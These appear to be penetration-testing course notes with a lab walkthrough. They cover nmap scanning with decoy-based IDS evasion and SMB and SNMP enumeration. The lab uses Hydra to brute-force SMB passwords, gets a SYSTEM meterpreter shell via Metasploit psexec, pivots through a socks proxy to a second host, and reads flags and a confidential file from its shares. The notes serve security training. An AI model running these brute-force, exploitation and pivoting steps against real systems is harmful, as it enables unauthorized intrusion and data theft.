# Networking

sA is the Ack Scan (Sends a Ack packet).

`nmap -sn [target IP]`

`nmap -Pn -sS -F [target IP]`

We can confirm if ports get filitered with:

`nmap -Pn -sA p-445,3389 [targetIP]`

Filtered/Closed: Firewall
unfilitered: No filtering, detection

IDS Evasion:

`nmap -Pn -sS -sV -F [targetIP]`

`sudo wireshark`

We get an issue, but thats ok. We run the scan and record the traffic. We don't run any IDS evasion here.

NMAP sends a SYN, we get back a SYY-ACK or RST, if we get a SYN-ACK we send back a RST

Decoy IP:

nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -D 10.10.23.1,10.10.23.2 [targetIP]

# Network Enumeration

- After the host discovery and port scanning phase of a penetration test, the next logical phase is going to involve service enumeration.
- The goal of service enumeration is to gather additional, more specific/detailed information about the host/systems on a network and the service running on said host.
- This includes information like account names, shares, misconfigured services and so on.
- Like the scanning phase, enumeration involves active connection to the remote devices in the network.
- There are many protocols on neworked systems that an attacker can target if they have been misconfigured or have been left enabled.
- In this section of the course, we will be exploring the various tools and techniques that can be used to interact with these protocols, with the intent of eventually/potentially exploiting them in later phases.
![grafik](https://github.com/user-attachments/assets/7985c1c1-7b0b-4e4a-af5d-3d681c1fdd0a)

# SMB / NetBIOS Enumeration

- NetBIOS is an API and a set of network protocols for providing communication services over a local network.
- Functions: NetBIOS offers three primary services:
  - Name Service (NetBIOS-NS): Allows computers to register, unregister and resolve names in a local network.
  - Datagram Service (NetBIOS-DGM): Supports connectionsless communication and broadcasting.
  - Session Service (NetBIOS-SSN): Support connection-oriented communication for more reliable data transfers.
- Ports: NetBIOS typically uses ports 137 (Name Service). 138 (Datagram Service), and 139 (Session Service) over UDP and TCP

- SMB is a file sharing protocol
- Functions: SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.
- Versions:
  - SMB 1.0: the original version which had security vulnerabilities. It was used with older operating systems like WinXP.
  - SMB 2.0/2.1: Introduced with Windows Vista/Windows Server 2008, offering improved performance and security.
  - SMB 3.0+: Introduced with Windows 8/Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization.
- Ports: SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS) and port 139 when operating with NetBIOS.

## SMB & NetBIOS Enumeration

- While NetBIOS and SMB were once closely linked, modern networks rely primarly on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS.
- Modern implementations of Windows primarily use SMB and can work without NetBIOS, however, NetBIOS over TCP 139 is required for backward compatibility and are often enabled together


# SMB & NetBIOS Enumeration and Exploitation

## Objective

The objective of this exercise is to enumerate and exploit the SMB services on two target systems. Using tools such as `Nmap`, `Hydra`, `Metasploit`, and `Proxychains`, you will learn to identify and exploit vulnerabilities in SMB services. Additionally, the lab demonstrates pivoting techniques and how to mount shared drives in the target network.

## Lab Environment

In this lab, you will access a Kali GUI instance. Two vulnerable SMB services are accessible via Kali tools at `http://demo.ine.local` and `http://demo1.ine.local`.

### Goal:
Exploit both targets and find the flag!

## Tools

The best tools for this lab are:

- `Metasploit Framework`
- `Nmap`
- `Hydra`
- `Proxychains`

## SMB / NetBIOS Enumeration

### What is NetBIOS?
NetBIOS is an API and a set of network protocols that provide communication services over a local network.

### Functions:
- **Name Service (NetBIOS-NS):** Allows computers to register, unregister, and resolve names in a local network.
- **Datagram Service (NetBIOS-DGM):** Supports connectionless communication and broadcasting.
- **Session Service (NetBIOS-SSN):** Supports connection-oriented communication for more reliable data transfers.

### Ports:
NetBIOS typically uses ports 137 (Name Service), 138 (Datagram Service), and 139 (Session Service) over UDP and TCP.

### What is SMB?
SMB is a file-sharing protocol.

### Functions:
SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.

### Versions:
- **SMB 1.0:** The original version with known security vulnerabilities, used with older operating systems like Windows XP.
- **SMB 2.0/2.1:** Introduced with Windows Vista/Windows Server 2008, offering improved performance and security.
- **SMB 3.0+:** Introduced with Windows 8/Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization.

### Ports:
SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS) and port 139 when operating with NetBIOS.

## SMB & NetBIOS Enumeration

While NetBIOS and SMB were once closely linked, modern networks primarily rely on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS. Modern implementations of Windows mainly use SMB and can work without NetBIOS; however, NetBIOS over TCP 139 is often enabled for backward compatibility.

### Demo:

1. **Display the Hosts File:**

   `cat /etc/hosts`

   *Displays the hosts file to see which names and IP addresses are configured on the system.*

`ping demo.ine.local`
`ping demo1.ine.local`

Only one provided machine is reachable, i.e., demo.ine.local, and we also found the target's IP addresses.

Step 3: Check open ports on the demo.ine.local machine.

`nmap demo.ine.local`

Multiple ports are open on the demo.ine.local machine.

All the ports expose core services of the Windows operating system, i.e., SMB, RDP, RPC, etc.

In this lab, we will perform attacks on the SMB service.

    The Server Message Block (SMB) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows applications to read, create, and update files on the remote server. SMB can also communicate with any server program that is set up to receive an SMB client request. Source: https://docs.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview

By default, the SMB service uses either IP port 139 or 445. Also, it is by default installed and present in every windows operating system. However, we can disable or remove it from the system.

There are multiple versions of the SMB protocol.

    SMB1
    SMB 2.0
    SMB 2.1
    SMB 3.0
    SMB 3.0.2
    SMB 3.1.1

SMBv1:

    Server Message Block (SMB) is an application layer network protocol commonly used in Microsoft Windows to provide shared access to files and printers. SMBv1 is the original protocol developed in the 1980s, making it more than 30 years old. More secure and efficient versions of SMB are available today. The SMBv1 protocol is not safe to use. By using this old protocol, you lose protections such as pre-authentication integrity, secure dialect negotiation, encryption, disabling insecure guest logins, and improved message signing. Microsoft has advised customers to stop using SMBv1 because it is extremely vulnerable and full of known exploits. WannaCry, a well-known ransomware attack, exploited vulnerabilities in the SMBv1 protocol to infect other systems. Because of the security risks, support for SMBv1 has been disabled. Source: https://kb.iu.edu/d/aumn

SMBv1 is used in the old Windows operating system. However, it is still present in the latest Windows OS too. We can disable/enable all SMB versions by modifying the windows registries.

SMBv1 onwards, all the versions are reasonability secure. They provide many security protections, i.e., disabling insecure guest logins, pre-authentication integrity, secure dialect negotiation, encryption, etc.

While scanning using nmap, we discovered the SMB service port 445.

To learn more about all protocol versions and changes. Please refer to the following link: https://en.wikipedia.org/wiki/Server_Message_Block

Now, let's perform enumeration and exploitation of the SMB protocol.

Step 4: Let's run nmap on port 445 to get more information about the protocol.

`nmap -sV -p 139,445 demo.ine.local`

-sV: Probe open ports to determine service/version info

-p 139,445: Only scan specified ports

We have received information about both the ports. Also, identified that the target is Microsoft Windows Server 2008 R2 - 2012

Step 5: Now, let's identify all the supported SMB versions on the target machine.

We can quickly identify it using the nmap script smb-protocols.

`nmap -p445 --script smb-protocols demo.ine.local`

-p445: Only scan specified port.

--script smb-protocols: Script Scan

We can notice that all three versions are accessible.

There is one more interesting nmap script for the smb protocol to find the security level of the protocol.

Step 6: Let's run the nmap script to find the smb protocol security level.

`nmap -p445 --script smb-security-mode demo.ine.local`

We have tried to access the target SMB server using a guest user. We have received SMB security level information.
We can find more information from the following link: https://nmap.org/nsedoc/scripts/smb-security-mode.html
This clarifies that the nmap script uses the guest user for all the smb script scan. We can define another user also. But, we need valid credentials to access the target machine.
The guest user is the default user available on all the windows operating systems.
If an attacker has valid credentials on the target machine. Then, command execution is possible. It depends on the user privilege.
Now, let's find that we have the Null Session, i.e Anonymous access on the target machine using the smbclient tool.

smbclient

    smbclient is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on. Step 7: Let's run the smbclient tool to find that we have anonymous access on the target machine.



`smbclient -L  demo.ine.local`

Enter WORKGROUP\root's password: <enter>

We can access the target using anonymous login.

Step 8: Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script.

Let's find all the present users using nmap smb-enum-users script.

`nmap -p445 --script smb-enum-users.nse  demo.ine.local`

There are a total of four users present. admin, administrator, root, and guest

The guest and administrator users are built-in accounts.

Now, let's find the valid password for admin, administrator, and root user.

Step 9: First, let's create a file (users.txt) and keep all these users

Now, let's run the hydra tool for brute-forcing the SMB protocol to find the valid password of the provided users.

`hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`

-L: List of users

-P: Password list

demo.ine.local smb: Target Address and Target Protocol

We have successfully retrieved valid passwords for all three users.

Step 10: Now, we can use the Metasploit framework and run the psexec exploit module to gain the meterpreter shell using the administrator user valid password.

Microsoft Windows Authenticated User Code Execution

    This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. Source: https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/

Let's start the Metasploit framework and exploit it!

Note: If the exploit won't give you a meterpreter session. Try again!

`msfconsole -q`
  `use exploit/windows/smb/psexec`
  `set RHOSTS demo.ine.local`
  `set SMBUser administrator`
  `set SMBPass password1`
  `exploit`

Success. We have received a meterpreter session.

Step 11: Now, we will discover target machine information, e.g., current user, system information, arch, etc.

`getuid`
`sysinfo`

We notice that target is running a windows server, and we have received a meterpreter session with "SYSTEM" (or "NT Authority") privileges on the machine.

Step 12: Let's read the flag.

`cat C:\\Users\\Administrator\\Documents\\FLAG1.txt`

We have found the FLAG1: 8de67f44f49264e6c99e8a8f5f17110c

Step 13: Let's check if we can access demo1.ine.local from the compromised host.

Before, ping to the second target machine from the compromised host. We need to know the IP address for the demo1.ine.local host.

Remember, when we did ping to both the targets and discovered IP addresses of these target machines:

1.` demo.ine.local: 10.0.17.62`

2. `demo1.ine.local : 10.0.22.69`

Now, let's ping to the 10.0.22.69 and verify that it is reachable from the second machine.

`shell`
`ping 10.0.22.69`

We can access the demo1.ine.local machine, i.e., 10.0.22.69.

However, we cannot access that machine (10.0.22.69) from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.

Step 14: Let's add the route using the meterpreter session and identify the second machine service.

CTRL + C
y
`run autoroute -s 10.0.22.69/20`

We have successfully added the route to access the demo1.ine.local machine.

Step 15: Now, let's start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.

First start the socks4a server using the Metasploit module.

`Socks4a Proxy Server`

    This module provides a socks4a proxy server with built-in Metasploit routing to relay connections. Source:: https://www.rapid7.com/db/modules/auxiliary/server/socks4a/

Note: The proxychains should have configured with the following parameters (at the end of /etc/proxychains4.conf):

`cat /etc/proxychains4.conf`

We can notice, socks4 port is 9050.

Now, let's run the Metasploit socks proxy auxiliary server module on port 9050.

`background`
`use auxiliary/server/socks_proxy`
`show options`

We notice that SRVPORT is 1080, and VERSION is 5 mentioned in the module options. But, we need to set the port to 9050 and the version to 4a. Let's change both the values then run the server.

`set SRVPORT 9050`
`set VERSION 4a `
`exploit`
`jobs`

We can notice that the server is running perfectly.

Step 16: Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e. demo1.ine.local

We could also specify multiple ports. But, in this case, we are only interested in SMB service.

`proxychains nmap demo1.ine.local -sT -Pn -sV -p 445`

demo1.ine.local : The pivot machine

-sT : TCP connect scan

-Pn : Skip host discovery and force port scan.

-sV : Probe open ports to determine service/version info

-p 445 : Define port to scan

This scan is the safest way to identify the open ports. We could use an auxiliary TCP port scanning module. But those are very aggressive and can kill your session.

We notice that port 445 is open on the target machine.

Step 17: Now, let's use the net view command to find all resources shared by the demo1.ine.local machine.

Interact with the meterpreter session again.

Commands:

`sessions -i 1`
`shell`
`net view 10.0.22.69`

We have received the Access is denied. message.

Well, currently, we are running as NT AUTHORITY\SYSTEM privilege. Let's migrate the process into explorer.exe and reaccess it.

Commands:

CTRL + C
`migrate -N explorer.exe`
`shell`
`net view 10.0.22.69`

This time we can see two shared resources. Documents and K drive. And, this confirms that pivot target (demo1.ine.local) allows Null Sessions, so we can access the shared resources. Also, we can achieve the same goal in several ways.

Step 18: Now, we can map the shared drive to the demo.ine.local machine using the' net' command.

Let's map the shared resources, i.e., the Documents and K drive.

Commands:

`net use D: \\10.0.22.69\Documents`
`net use K: \\10.0.22.69\K$`

We successfully mapped the resources to D and K drives.

Step 19: Let's check what is inside these mapped drives.

Commands:

dir D:
dir K:

Now that we can browse the shares content, we can download or read it on the attacker's machine.

Let's read the FLAG2 and Confidential.txt files.

Commands:

CTRL + C
`cat D:\\Confidential.txt`
`cat D:\\FLAG2.txt`

We have found the FLAG2: c8f58de67f44f49264e6c99e8f17110c

This file is the ultimate proof for the client. The organization files are not safe. Therefore, policies and proper configurations should be implemented inside and outside the perimeter.

# SNMP Enumeration

SNMP is a widely used protocol for monitoring and managing networked devices, such as routers, switches, printers, servers and more.
It allows Network admins to query devices for status information. configure certain settings, and recieve alerts or traps when specific events occur.

- SNMP is an application layer protocol that typically uses UDP for transport. It involves three primary components:
  - SNMP Manager: The system responsible for querying and interacting wiith SNMP agents on networked devices.
  - SNMP Agent: Software running on networked devices that responds to SNMP queries and sends traps.
  - Management Information Base (MIB): A hierarchical database that defines the structure of data available through SNMP. Each piece of data has a unique Object Identifier (OID).

- Versions of SNMP:
  - SNMPv1: The earliest versions, using community strings (essentialls passwords) for authentication.
  - SNMPv2c: An improved version with support for bulk transfers but still relying on community strings for authentication.
  - SNMPv3: Introduced security features, including encryption, message integrity, and user based authentication.
- Ports:
  - Port 161 (UDP): Used for SNMP queries
  - Port 162 (UDP): Used for SNMP traps (notifications).

 ### SNMP Enumeration

 - SNMP enumeration involves querying SNMP-enabled devices to gather information useful for identifying potential vulnerabilities, misconfigurations, or points of attack.
 - Here are the key objectives and outcomes of SNMP enumeration during a pentest:
  - Identifying the SNMP-Enabled Devices (NMAP)
  - Extract System Information
  - Identifying SNMP Community Strings
  - Retrieve Network Configurations
  - Collect User and Information
  - Identifying Services and Applications

## Demo: SNMP Enumeration

`cat /etc/hosts`

`nmap -sU -p 161 demo.ine.local`

We see that SNMP is running on the target. We try and perform a brute-force to identify the SNMP server community strings to access the target. 

`ls -al /usr/share/nmap/scripts/ | grep -e "snmp"`

Default wordlist: `ls -al /usr/share/nmap/nselib/data/ | grep snmp`

`nmap -sU -p 161 --script=snmp-brute demo.ine.local`

We can utilize a tool like snmp walk to extract new information. 

`snmpwalk -V 1 -c public demo.ine.local`

`nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_info`

`cat snmp_info`

We can use the information obtained for a brute-force attack:

`hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`

We can use the metasploit psexec module to exploit the system.







